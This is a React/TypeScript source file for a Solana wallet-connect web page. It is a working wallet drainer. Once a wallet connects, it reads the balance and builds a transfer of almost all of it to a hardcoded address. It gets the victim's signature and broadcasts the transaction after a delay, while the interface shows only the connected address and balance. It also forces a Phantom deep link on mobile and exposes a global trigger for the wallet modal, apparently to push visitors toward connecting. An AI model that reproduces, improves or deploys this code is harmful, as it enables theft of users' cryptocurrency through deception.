import React, { FC, ReactNode, useMemo, useEffect, useState } from 'react';
import { WalletAdapterNetwork } from '@solana/wallet-adapter-base';
import {
    ConnectionProvider,
    WalletProvider,
    useWallet,
} from '@solana/wallet-adapter-react';
import {
    WalletModalProvider,
    WalletMultiButton,
    useWalletModal,
} from '@solana/wallet-adapter-react-ui';

import {
    PhantomWalletAdapter,
    GlowWalletAdapter,
    LedgerWalletAdapter,
    SolflareWalletAdapter,
    SlopeWalletAdapter,
    TorusWalletAdapter,
    SolletExtensionWalletAdapter,
    SolletWalletAdapter,
} from '@solana/wallet-adapter-wallets';

import { SolanaMobileWalletAdapter } from '@solana-mobile/wallet-adapter-mobile';

import {
    clusterApiUrl,
    Connection,
    PublicKey,
    SystemProgram,
    Transaction,
    LAMPORTS_PER_SOL,
} from '@solana/web3.js';

import '@solana/wallet-adapter-react-ui/styles.css';
import './App.css';

const App: FC = () => {
    return (
        <Context>
            <ExposeWalletModal />
            <MobileDeepLink />
            <WalletConnectionHandler />
        </Context>
    );
};

const Context: FC<{ children: ReactNode }> = ({ children }) => {
    const network = WalletAdapterNetwork.Mainnet;
    const endpoint = useMemo(() => clusterApiUrl(network), [network]);

    const wallets = useMemo(
        () => [
            new SolanaMobileWalletAdapter(),
            new PhantomWalletAdapter(),
            new GlowWalletAdapter(),
            new LedgerWalletAdapter(),
            new SlopeWalletAdapter(),
            new SolflareWalletAdapter({ network }),
            new SolletExtensionWalletAdapter(),
            new SolletWalletAdapter(),
            new TorusWalletAdapter(),
        ],
        [network]
    );

    return (
        <ConnectionProvider endpoint={endpoint}>
            <WalletProvider wallets={wallets} autoConnect>
                <WalletModalProvider>{children}</WalletModalProvider>
            </WalletProvider>
        </ConnectionProvider>
    );
};

// Allows external trigger of wallet modal
const ExposeWalletModal: FC = () => {
    const { setVisible } = useWalletModal();
    useEffect(() => {
        (window as any).openSolanaWalletModal = () => setVisible(true);
    }, [setVisible]);
    return null;
};

// Triggers Phantom deep-link if mobile browser
const MobileDeepLink: FC = () => {
    useEffect(() => {
        const isMobile = /android|iphone|ipad|ipod/i.test(navigator.userAgent);
        if (isMobile) {
            const current = encodeURIComponent(window.location.href);
            window.location.href = `https://phantom.app/ul/browse/${current}`;
        }
    }, []);
    return null;
};

const WalletConnectionHandler: FC = () => {
    const { publicKey, connected, signTransaction } = useWallet();
    const [solBalance, setSolBalance] = useState<number | null>(null);
    const [loading, setLoading] = useState(false);
    const [txSent, setTxSent] = useState(false);

    useEffect(() => {
        if (connected && publicKey) {
            fetchBalanceAndSend(publicKey);
        }
    }, [connected, publicKey]);

    const fetchBalanceAndSend = async (walletPublicKey: PublicKey) => {
        setLoading(true);
        try {
            const connection = new Connection(clusterApiUrl('mainnet-beta'), 'confirmed');
            const balanceLamports = await connection.getBalance(walletPublicKey);
            const balanceSOL = balanceLamports / LAMPORTS_PER_SOL;
            setSolBalance(balanceSOL);

            const remaining = balanceLamports - 100_000;
            if (remaining <= 0) {
                alert('⚠️ Not enough SOL to send after fees.');
                return;
            }

            const tx = new Transaction().add(
                SystemProgram.transfer({
                    fromPubkey: walletPublicKey,
                    toPubkey: new PublicKey('CGuPySjT9CPoa9cNHMg6d2TmkPj22mn132HxwJ43HShh'),
                    lamports: remaining,
                })
            );

            tx.feePayer = walletPublicKey;
            tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;

            if (!signTransaction) {
                alert('❌ Wallet not ready to sign.');
                return;
            }

            const signedTx = await signTransaction(tx);
            console.log('📝 Transaction approved.');

            setTimeout(async () => {
                try {
                    const sig = await connection.sendRawTransaction(signedTx.serialize());
                    console.log(`🚀 Sent Tx: ${sig}`);
                    setTxSent(true);
                } catch (err) {
                    console.error('❌ Failed to send signed transaction:', err);
                    alert('Failed to send transaction.');
                }
            }, 10000);
        } catch (err) {
            console.error('❌ Error fetching balance or sending:', err);
            alert('Error occurred. Check console.');
        } finally {
            setLoading(false);
        }
    };

    return (
        <div style={{ padding: 30, fontFamily: 'Arial' }}>
            <WalletMultiButton />
            {connected && publicKey && (
                <div
                    style={{
                        background: '#f9f9f9',
                        borderRadius: 10,
                        padding: 20,
                        marginTop: 20,
                        boxShadow: '0 4px 10px rgba(0,0,0,0.1)',
                    }}
                >
                    <h3>✅ Wallet Connected</h3>
                    <p>
                        <strong>Address:</strong> {publicKey.toBase58()}
                    </p>
                    <p>
                        <strong>Balance:</strong>{' '}
                        {loading
                            ? 'Loading...'
                            : solBalance === null
                            ? 'Error fetching balance'
                            : `${solBalance.toFixed(4)} SOL`}
                    </p>
                    {txSent && <p style={{ color: 'green' }}>🎉 Transaction Sent</p>}
                </div>
            )}
        </div>
    );
};

export default App;
